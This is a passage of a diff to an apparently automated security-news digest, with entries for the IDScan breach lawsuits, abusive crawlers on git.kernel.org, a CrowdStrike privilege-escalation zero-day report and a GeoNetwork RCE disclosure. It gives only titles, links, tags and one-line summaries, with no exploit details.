   - Summary: Multiple lawsuits have been filed against identity verification company IDScan after hackers allegedly breached the service and offered to sell more than 153 million driver's licenses. [...]
 
-### Cluster 5aa1b8fc43 — score 8
-
-- Title: Creepy crawlies
-- Source: Simon Willison (ai_security_agentic_risk)
-- Published: 2026-09-07T23:08:58+00:00
-- Link: https://simonwillison.net/2026/Sep/7/creepy-crawlies/
-- Fetch status: not_attempted
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Primary article taxonomy
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Summary
-
-```
-Creepy crawlies Konstantin Ryabitsev discusses how bad the "background radiation" of abusive crawlers has become from the perspective of git.kernel.org , the official Git repository for the Linux kernel: TL;DR: we spend more CPU cycles rendering commits for scrapers than we spend on all other kinds of legitimate access, including git clones. At any one time, across 5 geo-distributed nodes, there are 14 CPU cores doing nothing but rendering git commits as html. I worry about this a lot from the perspective of Datasette, which serves a huge number of crawlable web pages. Via Hacker News Tags: crawling , git , linux , datasette , ai-ethics
-```
-
-#### Corroborating sources (1)
-
-- **Simon Willison** (ai_security_agentic_risk)
-  - Title: Creepy crawlies
-  - Published: 2026-09-07T23:08:58+00:00
-  - Link: https://simonwillison.net/2026/Sep/7/creepy-crawlies/
-  - Summary: Creepy crawlies Konstantin Ryabitsev discusses how bad the "background radiation" of abusive crawlers has become from the perspective of git.kernel.org , the official Git repository for the Linux kernel: TL;DR: we spend more CPU cycles rendering commits for scrapers than we spend on all other kinds of legitimate access, including git clones. At any one time, across 5 geo-distributed nodes, there are 14 CPU cores doing nothing but rendering git commits as html. I worry about this a lot from the perspective of Datasette, which serves a huge number of crawlable web pages. Via Hacker News Tags: crawling , git , linux , datasette , ai-ethics
-
 ### Cluster fb837e9843 — score 8
 
 - Title: AI's Vulnerability Surge May Be More Manageable Than First Feared
@@ -4138,6 +4109,43 @@ New research suggests the coming Vulnpocalypse may not be so overwhelming for en
   - Published: 2026-09-02T21:14:06+00:00
   - Link: https://www.darkreading.com/application-security/ai-vulnerability-surge-manageable-than-first-feared
   - Summary: New research suggests the coming Vulnpocalypse may not be so overwhelming for enterprise security teams — if they have the right strategies.
+
+### Cluster 817be3097f — score 8
+
+- Title: Researcher Publishes CrowdStrike Privilege Escalation Zero Day
+- Source: Infosecurity Magazine (cyber_news_breach_reporting)
+- Published: 2026-09-07T08:28:00+00:00
+- Link: https://www.infosecurity-magazine.com/news/crowdstrike-privilege-escalation/
+- Fetch status: not_attempted
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: zero_day
+- urgency_signals: zero_day
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: zero_day
+- urgency_signals: zero_day
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+A security researcher has posted a zero-day exploit in CrowdStrike which could allow hackers to escalate privileges
+```
+
+#### Corroborating sources (1)
+
+- **Infosecurity Magazine** (cyber_news_breach_reporting)
+  - Title: Researcher Publishes CrowdStrike Privilege Escalation Zero Day
+  - Published: 2026-09-07T08:28:00+00:00
+  - Link: https://www.infosecurity-magazine.com/news/crowdstrike-privilege-escalation/
+  - Summary: A security researcher has posted a zero-day exploit in CrowdStrike which could allow hackers to escalate privileges
 
 ### Cluster 8c1deb8826 — score 8
 
@@ -4317,40 +4325,3 @@ submitted by /u/_pimps [link] [comments]
   - Published: 2026-09-07T03:47:14+00:00
   - Link: https://www.reddit.com/r/netsec/comments/1w9h4ng/from_padding_oracle_to_shell_unauthenticated_rce/
   - Summary: submitted by /u/_pimps [link] [comments]
-
-### Cluster 32f0368f4d — score 8
-
-- Title: GeoNetwork - Pre-Auth RCE via Unauthenticated File Upload and Unsafe XSLT Processor (4 CVEs, 121 government deployments, all patched)
-- Source: Reddit r/netsec (reddit_practitioner_osint)
-- Published: 2026-09-01T09:29:24+00:00
-- Link: https://www.reddit.com/r/netsec/comments/1w46vwa/geonetwork_preauth_rce_via_unauthenticated_file/
-- Fetch status: not_attempted
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- affected_industries: government
-- urgency_signals: preauth_unauth
-- content_type: news_report
-- confidence_tier: tier_5_chatter
-
-#### Primary article taxonomy
-- affected_industries: government
-- urgency_signals: preauth_unauth
-- content_type: news_report
-- confidence_tier: tier_5_chatter
-
-#### Summary
-
-```
-submitted by /u/ZealousidealHunter80 [link] [comments]
-```
-
-#### Corroborating sources (1)
-
-- **Reddit r/netsec** (reddit_practitioner_osint)
-  - Title: GeoNetwork - Pre-Auth RCE via Unauthenticated File Upload and Unsafe XSLT Processor (4 CVEs, 121 government deployments, all patched)
-  - Published: 2026-09-01T09:29:24+00:00
-  - Link: https://www.reddit.com/r/netsec/comments/1w46vwa/geonetwork_preauth_rce_via_unauthenticated_file/
-  - Summary: submitted by /u/ZealousidealHunter80 [link] [comments]
